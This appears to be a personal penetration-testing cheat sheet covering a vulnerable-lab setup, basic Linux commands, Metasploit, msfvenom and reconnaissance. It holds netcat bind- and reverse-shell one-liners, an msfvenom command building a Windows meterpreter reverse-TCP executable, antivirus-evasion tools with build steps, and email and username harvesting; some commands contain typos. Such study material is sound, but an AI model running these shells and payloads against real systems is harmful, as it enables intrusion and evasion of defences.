# omegaspard-pentest-cheat-sheet
My penetration testing cheat sheet.

## Download links to set up lab environment.

### Attacker machine

- [VMWare](https://my.vmware.com/web/vmware/downloads)
- [OSCP Kali linux distribution VM](https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/)
- [Nessus](https://www.tenable.com/downloads/nessus?loginAttempted=true)
  A vulnerability scanner.
  - Download and install the deb package.
  - Run the service with `/bin/systemctl start nessusd.serivce`
  - Go to https://kali:8834/# to finish the installation.
- [Ming C Compiler]()
  Cross compiler to run C code on windows.
  `apt-get install mingw-w64`
- [Hyperion](https://nullsecurity.net/tools/binary.html)
  Encrytion program to bypass antivirus software.
  - Need to install the Ming C Compiler.
  - Download the zip file.
  - Generate the exe file with `i686-w64-mingw32-gcc -ISrc/Payloads/Aes/c Src/Crypter/*.c Src/Payloads/Aes/c/*.c -o hyperion.exe`
- [Veil-Evasion]()
  Payload generator to bypass antivirus software.
  - Download https://github.com/Veil-Framework/Veil-Evasion/archive/master.zip
  - Unzip and run the ./setupt/setup.sh file.
  
### Target machine

- [Android studio](https://developer.android.com/studio)
  To get the android sdk and the emulator.
- [Ubuntu 8.10 VM torrent file (by Georgia Weidman)](https://nostarch.com/download/Penetration%20Testing%20Georgia%20Weidman%20Supplementary%20Files%20No%20Starch%20Press%20[mininova].torrent)
- [Windows XP SP3 (no product key)](https://archive.org/details/windowsxp_20190627) 
- [Windows 7 SP1](https://support.microsoft.com/en-us/windows/install-windows-7-service-pack-1-sp1-b3da2c0f-cdb6-0572-8596-bab972897f61)

**Vulnerable software for Windows XP**

- [Zervit 0.4](http://www.exploit-db.com/exploits/12582/).
  - Use the port 3232.
- [SLMail 5.5](http://www.exploit-db.com/exploits/638)
  - Restart VM and set up user after installation.
- [3Com TFTP 2.0.1](http://www.exploit-db.com/exploits/3388/)
  - Copy the file to `C:\Windows`, run and install service.
- [XAMPP 1.7.2](https://sourceforge.net/projects/xampp/files/XAMPP%20Windows/1.7.2/xampp-win32-1.7.2.zip/download)
  - Add the service that you want (Apache, MySql, FilzZilla etc)
  - Set up user.
- [Adobe acrobat reader 8.1.2](http://www.oldversion.com/windows/acrobat-reader-8-1-2)
- [War-FTP 1.65](http://www.exploit-db.com/exploits/3570/)
- [WinSCP](http://winscp.net/)

**Addtional tools for Windows XP**

- [Immunity debugger](http://debugger.immunityinc.com/ID_register.py)
  (It will install Python)
- [Mona](https://github.com/corelan/mona/archive/master.zip)
  - Copy the file `mona.py` to `C:Program Files\Immunity Inc\Immunity Debugger\PyCommands`.
  
**Additional tools for Windows 7**
- [Java 7](https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html)
- [Winamp version 5.55](http://www.oldversion.fr/windows/download/winamp-5-55-full-2)
- [Microsoft Security Essentials](https://www.commentcamarche.net/download/telecharger-34061039-microsoft-security-essentials)

## Basic Linux commands

**adduser**

Permet de créer un nouvel utilisateur et son groupe correspondant.

- `adduser gaspard` pour créer l'utilisateur.
- `adduser gaspard omega` pour ajouter l'utilisateur gaspard au groupe omega.
- `adduser gaspard sudo` ajouter gaspard au groupe `sudoers` qui permetra d'utiliser la commande `sudo` en tant que gaspard.



**nano**

- `nano file_name` to open file.
- `CTRL+W` to search.
- `CTRL+X` to exit.
- `CTRL+K` to cut and `CTRL+U` to uncut.
- `CTRL+J` to justify.
- `CTRL+O` to save.

**vi**

- Enter `I` to be in insert mode and type stuff then `ESC` to leave the `INSERT` mode.
- `:wq` to save and exit.

**grep**

Look for instance of string in what we give to it.

- `grep hahaha file_hahah` will look for *haha* in fiel_haha.

**cut**

Extract from entry based on a delimiter.

- `cut -d " " -f 2` will return the second word separated from a space of each line we pass to it.

**sed**

Replace based on pattern.

- `sed 's/hello/bonjour' file_name` will replace hello by bonjour in file_name and return the string of the new file on the standard output.

**awk**

Pattern matching.

- `awk '$2 >4' file_name` for each line in file_name, will return each line in which the seocond word is greater than 4.
- `awk '{print $1,$3;}' file_name` return the first and third word of each line and print it.

**Networking**

- `ifconfig`
- Edit `/etc/network/interfaces` to set a static IP address.
- `netstat -antp` to see what program use which port and what is the current state. 

**apt**

Manage package on the system.

- `apt-get install pacakge_name`
- `apt-get upgrade package_name`
- `apt-get update` to update the cache with the `sources.list file`.

**Services**

Start and stop services.

- `systemctl service_name start`
- `systemctl service_name stop`
- `systemctl service_name enable`
- `systemctl service_name disable`

The command `service` can also be used, if the service isn't available in those command the service bin should be in `/etc/init.d` or `/etc/rc.d`.

**Netcat**

To mannipulate TCP/IP connections netcat is a good tool.

- `nc -v 192.168.25.36 80` create a netcat connection with the address IP on the port 80 (-v for verbose mode).
- `nc -lvp 8888` create a netcat that wait for connection on the port 8888.
- `nc -lvp 8888 -e /bin/bash` will open a shell if it receives a connection on the port 8888.
- `nc -v 192.168.25.36 80 -e /bin/bash` push the command shell to the netcat listener.
- `nc -v 192.168.25.36 8888 < file` connect to netcat then write the file to it.
- `nc -lvp 8888 > file` wait for a connection and write the file.

**cron**

Schedule tasks.

- In the folder `/etc` we can find directories like `crond.d`, `crond.daily`, `crond.hourly`, `crond.monthly`, `crond.weekly` those execute the scripts present in them at a period corresponding to the one indicated to their name.
- `crontab` is a file used for custom scheduling.
- The format of each corn entry is `m h dom mon dow user command`, dom for day, mon for month.

## Scripts

- The file must start by `#!/bin/bash` this comment indicate that the script use bash.
- For python it would be `#!/usr/bin/python`.

**if statement**

```bash
#!/bin/bash
if [ "$1" == ""]
then
echo "Usage: ./script_name.sh [arg1]"
echo "example: ./script_name.sh bonjour"
fi
```

**loop statement**

```bash
#!/bin/bash
if [ "$1" == ""]
then
echo "Usage: ./script_name.sh [arg1]"
echo "example: ./script_name.sh bonjour"
else
for number in `seq 1 100`; do
echo $1$number
done
fi
```

## Exploits database website

- [Rapid7](https://www.rapid7.com/db/modules/)

## Metasploits

Metasploit is a big framework that provide many pentesting features.

- To start it you need to:  - `service postgresql start` because it needs a database to run.
  - `msfdb init` to initialize the database.
  - `msfconsole` to start metasploit console interface.
  
- To use an exploit after running the msfconsole :
  - `search [vunerabitlity name]` to get the URI of the exploit.
  - `use [exploit URI]` to use the exploit.
  - `show options` to see the option.
  - `set [OPTION] [VALUE]` to set an option.
  - `show targets` to get the target list of this exploit. (Then use `set [Name/list number of the target]`)
  - `show payloads` to get the list of the exploit. (Then use `set [Name/list number of the payload]`)
  - Once everything needed is set you can start the exploit with `exploit`.

- `msfconsole -x "use [URI]; set [OPTION] [VALUE]; set [TARGET]; set [PAYLOAD]; exploit;` to run on one line.
- `show -h` to display everything we can do on metasploit such as auxiliary allowing you by example to scan or else...

**Bind shell**

Open a port on the target machine, it's up to the attacker to connect to it after.

**Reverse shell**

Pushes a connexion from the target machine to the attacker machine. This one is more likely to succeed because *bind shell* are often bloked by the firefall.

**Msfvenom**

Msfvenom is a tool generating executable payload on the target machine. 

Note: It does not handle the delivery of the payload and we need to exploit an user fault in order to make it execute the payload.

- `msfvenom -l payloads` to list the payload.
- `msfvenom -p [PAYLOAD URI] -o` to show the needed options of the payload.
- `msfvenom --help-formats` to display all the available format of the generated payload.
- `msfvenom -p [PAYLOAD URI] [OPTION 1]=[VALUE] [OPTION X}=[VALUE] -f exe -o [GENERATED PAYLOAD NAME]` to produce the payload.

Example:
`msfvenim -p windows/meterpreter/revese_tcp LHOST=192.168.43.78 LPORT=12345 -f exe -o payload.exe`

Note: A meterpreter payload is an upgraded shell. Natively when we connect a shell from a windows machine, we use it on a linux shell, it's ugly.
Meterpreter make it transparent and propose other feature.

**multihandler**

If we execute a payload on the target machine generated by msfvenom, we still to receive the connexion from the target.

In msfconsole:
- `use multi/handler`
- `show options`
- `set LHOST 192.168.43.78`
- `set LPORT 12345`
- `exploit` The handler is now waiting for connexion on the attacker machine on the port.

## Informations gathering

- [Netcraft](https://sitereport.netcraft.com) A website scanner.
- `whois website.com` gives informations surch as technical contacts or DNS name servers.
- `nslookup` command to learn more about the DNS of the target server.
- Zone transfer allow to replicate the data from the primary DNS server to a backup, if it's not secure we can use the command `host -l domain.com ns.domain.com` to get the DNS records, and eventually get informations about the different services known to have vulnerabilities.
- `theharbester -d google.com -l 500 -b all` browse the internet with the specified domain looking for critical informations (mail, username, phone number, websites)

**Note on DNS**
DNS means Domain Name System,it is the service that resolve the IP address of a server to its domain name counter part.

A domain name is the human readable name that we use in order to browse the internet such as `www.google.com` where `www` is the sub domain, `google.com` is the domain and `com` is the TLD (Second Level Domain). Those are managed by organisation named `Domain registrar`.

Another component of the DNS are the `Domain servers` those are the machine linking the IP address to the different domain name, the entity linking the two are named
`DNS records`, the most commons are the `A record` or the `MX record` (mail server).

**Port scanning**

- `nc -vv 192.168.43.245 25` scan mannually with netcat (legal).
- `nmap -sV [ADDRESS] -oA [FILENAME]` run a TCP scan giving infos on the versions with the result wrote in the file.
- `nmap -sU -p [PORT] [ADDRESS]` run a UDP scan on the specific port.



 
